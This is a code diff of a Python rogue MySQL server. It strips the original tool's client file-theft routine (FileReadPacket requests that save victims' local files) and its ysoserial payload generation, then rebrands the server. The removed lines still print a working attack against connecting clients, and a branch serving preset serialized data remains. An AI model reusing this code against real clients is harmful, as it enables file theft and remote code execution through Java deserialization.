@@ -19,59 +19,10 @@ from mysqlproto.protocol.query import (
     ResultSet,
     FileReadPacket,
 )
-import subprocess
-import time
 
 
 async def accept_server(server_reader, server_writer):
     task = asyncio.Task(handle_server(server_reader, server_writer))
-
-
-async def process_fileread(server_reader, server_writer, filename):
-    print("Start Reading File:" + filename.decode("utf8"))
-    FileReadPacket(filename).write(server_writer)
-    await server_writer.drain()
-    # server_writer.reset()
-    # time.sleep(3)
-
-    isFinish = False
-    outContent = b""
-    outputFileName = "%s/%s___%d___%s" % (
-        fileOutputDir,
-        server_writer.get_extra_info("peername")[:2][0],
-        int(time.time()),
-        filename.decode("ascii").replace("/", "_").replace("\\", "_").replace(":", "_"),
-    )
-    while not isFinish:
-        packet = server_reader.packet()
-        while True:
-            fileData = await packet.read()
-            # 当前packet没有未读取完的数据
-            if fileData == "":
-                break
-            # 空包,文件读取结束
-            if fileData == b"":
-                isFinish = True
-                break
-            outContent += fileData
-    if len(outContent) == 0:
-        print("Nothing had been read")
-    else:
-        if displayFileContentOnScreen:
-            print("========File Conntent Preview=========")
-            try:
-                print(outContent.decode("utf8")[:1000])
-            except Exception as e:
-                # print(e)
-                print(outContent[:1000])
-            print("=======File Conntent Preview End==========")
-        if saveToFile:
-            with open(outputFileName, "wb") as f:
-                f.write(outContent)
-            print("Save to File:" + outputFileName)
-    # OK(capability, handshake.status).write(server_writer)
-    # server_writer.close()
-    return
 
 
 async def handle_server(server_reader, server_writer):
@@ -121,42 +72,38 @@ async def handle_server(server_reader, server_writer):
         if query != "":
             query = query.decode("ascii")
             print(query)
-        # if username.startswith(b"fileread_"):
-        #     await process_fileread(
-        #         server_reader, server_writer, username[len("fileread_") :]
-        #     )
-        #     result = OK(capability, handshake.status)
-        #     # return
-        # elif username in fileread_dict:
-        #     # query =(await packet.read())
-        #     await process_fileread(
-        #         server_reader, server_writer, fileread_dict[username]
-        #     )
-        #     result = OK(capability, handshake.status)
-        #     # return
-        # elif username not in yso_dict and not username.startswith(b"yso_"):
-        #     # query =(await packet.read())
-        #     await process_fileread(
-        #         server_reader, server_writer, random.choice(defaultFiles)
-        #     )
-        #     result = OK(capability, handshake.status)
         if cmd == 1:
             result = OK(capability, handshake.status)
-            # return
         elif cmd == 3:
-            # query = (await packet.read()).decode('ascii')
+            # query = (yield from packet.read()).decode('ascii')
             if "SHOW VARIABLES".lower() in query.lower():
                 print("Sending Fake MySQL Server Environment Data")
                 ColumnDefinitionList(
                     (ColumnDefinition("d"), ColumnDefinition("e"))
                 ).write(server_writer)
                 EOF(capability, handshake.status).write(server_writer)
-                ResultSet(("max_allowed_packet", "67108864")).write(server_writer)
+                ResultSet(("max_allowed_packet", "65535")).write(server_writer)
                 ResultSet(("system_time_zone", "UTC")).write(server_writer)
                 ResultSet(("time_zone", "SYSTEM")).write(server_writer)
                 ResultSet(("init_connect", "")).write(server_writer)
                 ResultSet(("auto_increment_increment", "1")).write(server_writer)
                 result = EOF(capability, handshake.status)
+            elif "set".lower() in query.lower():
+                # print("Sending Fake MySQL Server Environment Data")
+                # ColumnDefinitionList(
+                #     (ColumnDefinition("d"), ColumnDefinition("e"))
+                # ).write(server_writer)
+                # EOF(capability, handshake.status).write(server_writer)
+                # ResultSet(("max_allowed_packet", "65535")).write(server_writer)
+                # ResultSet(("system_time_zone", "UTC")).write(server_writer)
+                # ResultSet(("time_zone", "SYSTEM")).write(server_writer)
+                # ResultSet(("init_connect", "")).write(server_writer)
+                # ResultSet(("auto_increment_increment", "1")).write(server_writer)
+                # result = EOF(capability, handshake.status)
+                result = OK(capability, handshake.status)
+
+            elif "SQL_AUTO_IS_NULL".lower() in query.lower():
+                result = OK(capability, handshake.status)
             elif username in yso_dict:
                 # Serial Data
                 print(
@@ -173,11 +120,17 @@ async def handle_server(server_reader, server_writer):
                 EOF(capability, handshake.status).write(server_writer)
                 ResultSet(("11", yso_dict[username], "2333")).write(server_writer)
                 result = EOF(capability, handshake.status)
-            elif username.startswith(b"yso_"):
-                query = await packet.read()
-                _, yso_type, yso_command = username.decode("ascii").split("_")
-                print("Sending YSO data with params:%s,%s" % (yso_type, yso_command))
-                content = get_yso_content(yso_type, yso_command)
+            elif query.encode("ascii").decode("ascii") == "select a,b,c from book":
+                # ColumnDefinitionList((ColumnDefinition("database"),)).write(
+                #     server_writer
+                # )
+                # EOF(capability, handshake.status).write(server_writer)
+                # ResultSet(("test",)).write(server_writer)
+                # result = EOF(capability, handshake.status)
+
+                print(
+                    "Sending Presetting Data with username " + username.decode("ascii")
+                )
                 ColumnDefinitionList(
                     (
                         ColumnDefinition("a"),
@@ -186,16 +139,24 @@ async def handle_server(server_reader, server_writer):
                     )
                 ).write(server_writer)
                 EOF(capability, handshake.status).write(server_writer)
-                ResultSet(("11", content, "2333")).write(server_writer)
+                ResultSet(("cochran", "asset pricing", "CN123456")).write(server_writer)
                 result = EOF(capability, handshake.status)
-            elif query == "select 1":
-                ColumnDefinitionList((ColumnDefinition("database"),)).write(
-                    server_writer
-                )
-                EOF(capability, handshake.status).write(server_writer)
-                ResultSet(("test",)).write(server_writer)
-                result = EOF(capability, handshake.status)
+
+            # elif flag == 1:
+            #       print("Sending Fake MySQL Server Environment Data")
+            #       ColumnDefinitionList((ColumnDefinition('d'),ColumnDefinition('e'))).write(server_writer)
+            #      EOF(capability, handshake.status).write(server_writer)
+            #     ResultSet(("max_allowed_packet","67108864")).write(server_writer)
+            #    ResultSet(("system_time_zone","UTC")).write(server_writer)
+            #   ResultSet(("time_zone","SYSTEM")).write(server_writer)
+            #  ResultSet(("init_connect","")).write(server_writer)
+            # ResultSet(("auto_increment_increment","1")).write(server_writer)
+            # result = EOF(capability, handshake.status)
+
             else:
+                # yield from process_fileread(
+                #     server_reader, server_writer, random.choice(defaultFiles)
+                # )
                 result = OK(capability, handshake.status)
 
         else:
@@ -209,75 +170,15 @@ async def handle_server(server_reader, server_writer):
 yso_dict = {"xxx": "xxx"}
 
 
-def get_yso_content(yso_type, command):
-    popen = subprocess.Popen(
-        [javaBinPath, "-jar", ysoserialPath, yso_type, command], stdout=subprocess.PIPE
-    )
-    file_content = popen.stdout.read()
-    return file_content
-
-
-def addYsoPaylod(username, yso_type, command):
-    yso_dict[username] = get_yso_content(yso_type, command)
-
-
 logging.basicConfig(level=logging.INFO)
 
-fileOutputDir = "./fileOutput/"
-displayFileContentOnScreen = True
-saveToFile = True
-fileread_dict = {}
-ysoserialPath = "ysoserial-0.0.6-SNAPSHOT-all.jar"
-javaBinPath = "java"
-defaultFiles = []
+
 if __name__ == "__main__":
-    import json
-
-    with open("config.json") as f:
-        data = json.load(f)
-
-    if "config" in data:
-        config_data = data["config"]
-        if "ysoserialPath" in config_data:
-            ysoserialPath = config_data["ysoserialPath"]
-        if "javaBinPath" in config_data:
-            javaBinPath = config_data["javaBinPath"]
-        if "fileOutputDir" in config_data:
-            fileOutputDir = config_data["fileOutputDir"]
-        if "displayFileContentOnScreen" in config_data:
-            displayFileContentOnScreen = config_data["displayFileContentOnScreen"]
-        if "saveToFile" in config_data:
-            saveToFile = config_data["saveToFile"]
-    import os
-
-    try:
-        os.makedirs(fileOutputDir)
-    except FileExistsError as _:
-        pass
-    for k, v in data["fileread"].items():
-        if k == "__defaultFiles":
-            defaultFiles = v
-            for i in range(len(defaultFiles)):
-                defaultFiles[i] = defaultFiles[i].encode("ascii")
-        else:
-            fileread_dict[k.encode("ascii")] = v.encode("ascii")
-
-    # print(fileread_dict)
-    if "yso" in data:
-        for k, v in data["yso"].items():
-            addYsoPaylod(k.encode("ascii"), v[0], v[1])
-    # print(yso_dict)
     loop = asyncio.get_event_loop()
     f = start_mysql_server(handle_server, host=None, port=3306)
     print("===========================================")
-    print("MySQL Fake Server")
-    print("Author:fnmsd(https://blog.csdn.net/fnmsd)")
-    print(
-        "Load %d Fileread usernames :%s"
-        % (len(fileread_dict), list(fileread_dict.keys()))
-    )
-    print("Load %d yso usernames :%s" % (len(yso_dict), list(yso_dict.keys())))
-    print("Load %d Default Files :%s" % (len(defaultFiles), defaultFiles))
+    print("ZshieldSQL")
+
     print("Start Server at port 3306")
     loop.run_until_complete(f)
     loop.run_forever()
